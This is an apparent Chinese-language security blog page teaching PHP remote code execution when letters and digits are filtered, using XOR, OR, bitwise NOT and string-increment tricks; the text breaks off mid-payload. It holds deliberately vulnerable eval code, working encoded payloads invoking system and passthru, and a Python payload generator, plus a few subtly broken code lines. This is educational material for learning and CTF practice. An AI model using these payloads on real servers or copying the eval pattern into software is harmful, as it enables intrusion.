@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RCE之无字母数字RCE | YoSheep's 学习笔记</title><meta name="author" content="YoSheep"><meta name="copyright" content="YoSheep"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="无字母数字RCE，就是在字母和数字都被过滤的情况下构造出webshell，进而达到命令执行的目的。 通常，过滤的语句大致写法： 12345678&lt;?php	$command &#x3D; $_GET[&#x27;w&#x27;];	if (preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;, $command))&#123;		die();	&#125; else &#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE之无字母数字RCE">
+<meta property="og:url" content="https://yosheep.github.io/posts/6157ec5d.html">
+<meta property="og:site_name" content="YoSheep&#39;s 学习笔记">
+<meta property="og:description" content="无字母数字RCE，就是在字母和数字都被过滤的情况下构造出webshell，进而达到命令执行的目的。 通常，过滤的语句大致写法： 12345678&lt;?php	$command &#x3D; $_GET[&#x27;w&#x27;];	if (preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;, $command))&#123;		die();	&#125; else &#123;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yosheep.github.io/img/yeah_circle.jpg">
+<meta property="article:published_time" content="2025-01-23T07:52:50.000Z">
+<meta property="article:modified_time" content="2025-01-24T08:26:37.820Z">
+<meta property="article:author" content="YoSheep">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yosheep.github.io/img/yeah_circle.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yosheep.github.io/posts/6157ec5d.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: YoSheep","link":"链接: ","source":"来源: YoSheep's 学习笔记","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RCE之无字母数字RCE',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-01-24 16:26:37'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="YoSheep's 学习笔记" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/yeah_circle.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw fa fa-sitemap"></i><span> sitemap</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="YoSheep's 学习笔记"><span class="site-name">YoSheep's 学习笔记</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw fa fa-sitemap"></i><span> sitemap</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">RCE之无字母数字RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-23T07:52:50.000Z" title="发表于 2025-01-23 15:52:50">2025-01-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-24T08:26:37.820Z" title="更新于 2025-01-24 16:26:37">2025-01-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.9k</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="RCE之无字母数字RCE"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/6157ec5d.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/6157ec5d.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>无字母数字RCE，就是在字母和数字都被过滤的情况下构造出webshell，进而达到命令执行的目的。</p>
+<p>通常，过滤的语句大致写法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$command</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，正则还可以写成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$command</span>))</span><br></pre></td></tr></table></figure>
+
+<p><code>/^\W+$/</code>中的\W 是一个预定义的字符类，表示 <strong>非单词字符</strong>，相对的\w表示<strong>单词字符</strong>。</p>
+<p>单词字符(\w)：</p>
+<ul>
+<li>大小写字母 (a-z, A-Z)</li>
+<li>数字 (0-9)</li>
+<li>下划线 (_)</li>
+</ul>
+<p>非单词字符（\W）是上面以外的任何字符，例如：</p>
+<ul>
+<li>标点符号（如 !, @, #）</li>
+<li>空格、换行符</li>
+<li>其他非字母数字的字符</li>
+</ul>
+<h2 id="用运算符实现"><a href="#用运算符实现" class="headerlink" title="用运算符实现"></a>用运算符实现</h2><p>先上一下表</p>
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/vmfHFZrN9GLSC8j.png" alt="img"></p>
+<h3 id="1、-异或运算符"><a href="#1、-异或运算符" class="headerlink" title="1、 异或运算符"></a>1、 异或运算符</h3><p><code>^</code></p>
+<p>两个字符异或操作后，会得到一个新的字符，例如：</p>
+<p><code>h</code>和<code>[</code>进行异或操作，得到的结果为<code>3</code></p>
+<p>这是由于，在ascii码表中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h: 104 0x68 01101000</span><br><span class="line">[: 91 0x5B 01011011</span><br></pre></td></tr></table></figure>
+
+<p>01101000和01011011逐位进行异或后，得到00110011，也就是0x33，在ascii码中表示是数字3:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;h&#x27;</span>^<span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">// 输出：3</span></span><br></pre></td></tr></table></figure>
+
+<p>例如像以下这样构造命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>); <span class="comment">// _</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>); <span class="comment">// _P</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>); <span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POS</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POST </span></span><br><span class="line"><span class="variable">$$__</span>[_](<span class="variable">$$__</span>[__]); <span class="comment">// $_POST[_]($_POST[__]);</span></span><br></pre></td></tr></table></figure>
+
+<p>使用时，讲上述构造的命令取消换行，并进行url编码，传入参数即可：</p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$w</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>), <span class="variable">$w</span>)&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$w</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Payload可以写成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?w=%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B&amp;_=system&amp;__=whoami</span><br></pre></td></tr></table></figure>
+
+<p>在实际应用中，可以通过python构造出我们需要的命令的异或算式，后续使用这个脚本，只需要修改payload和正则表达式即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_xor_expression</span>(<span class="params">payload, filter_regex</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据目标 payload 和过滤正则表达式，生成异或表达式。</span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        payload: 目标字符串</span></span><br><span class="line"><span class="string">        filter_regex: 用于过滤字符的正则表达式</span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        构造的异或表达式字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    xor_1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    xor_2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    usable_chars = []</span><br><span class="line">		</span><br><span class="line">    <span class="comment"># 找到没有被过滤的可用字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(i) <span class="keyword">not</span> <span class="keyword">in</span> filter_regex:</span><br><span class="line">            usable_chars.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历目标 payload 的每个字符，找到对应的异或字符对</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> usable_chars:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">127</span>) == payload[k]:  <span class="comment"># 检查两个字符异或结果是否等于目标字符</span></span><br><span class="line">                xor_1 += i</span><br><span class="line">                xor_2 += <span class="built_in">chr</span>(<span class="number">127</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建最终的表达式，将字符进行URL编码</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;(&#x27;&quot;</span> + urllib.parse.quote(xor_1) + <span class="string">&quot;&#x27;^&#x27;&quot;</span> + urllib.parse.quote(xor_2) + <span class="string">&quot;&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = <span class="string">&quot;ls&quot;</span>  <span class="comment"># 要生成的目标 payload</span></span><br><span class="line">    filter_regex = <span class="string">r&#x27;[a-zA-Z0-9]&#x27;</span>  <span class="comment"># 定义过滤正则表达式</span></span><br><span class="line">    result = generate_xor_expression(payload, filter_regex)  <span class="comment"># 调用函数</span></span><br><span class="line">    <span class="built_in">print</span>(result)  <span class="comment"># 打印最终生成的表达式</span></span><br></pre></td></tr></table></figure>
+
+<p>测试：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Yes&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;No&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构建payload：<code>passthru(ls)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;%0F%1E%0C%0C%0B%17%0D%0A&#x27;^&#x27;%7F%7F%7F%7F%7F%7F%7F%7F&#x27;)(&#x27;%13%0C&#x27;^&#x27;%7F%7F&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250122153948786.png" alt="image-20250122153948786"></p>
+<h3 id="2、-或运算符"><a href="#2、-或运算符" class="headerlink" title="2、 或运算符"></a>2、 或运算符</h3><p><code>|</code></p>
+<p>同上异或的原理，不过需要改一下脚本里的运算符</p>
+<h3 id="3、-取反"><a href="#3、-取反" class="headerlink" title="3、 取反"></a>3、 取反</h3><p><code>~</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span> = ~<span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的结果为<code>%8C%86%8C%8B%9A%92</code>，此时将改数据再取反，就可以得到我们想要的<code>system</code>，利用方式和异或部分同理。</p>
+<h3 id="4、-自增"><a href="#4、-自增" class="headerlink" title="4、 自增"></a>4、 自增</h3><p>利用自增，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;a&quot;++ =&gt; &quot;b&quot;</span><br></pre></td></tr></table></figure>
+
+<p>所以，只要能够得到一个字符，我们就可以通过自增或自减的方式得到所有的字母。那么，要如何得到一个字母，例如A，在PHP中，强制连接数组和字符串的话，数组将会被转化为字符串，其值为“Array”。再取这个字符串的第一个字母，就可以得到A。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;&#x27;.[];</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250122230523498.png" alt="image-20250122230523498"></p>
+<p>还有其他的取字母的方法，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(0/0).&#x27;&#x27;   //NAN</span><br><span class="line">(1/0).&#x27;&#x27;   //INF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250122230657353.png" alt="image-20250122230657353"></p>
+<p>参考佬的payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span 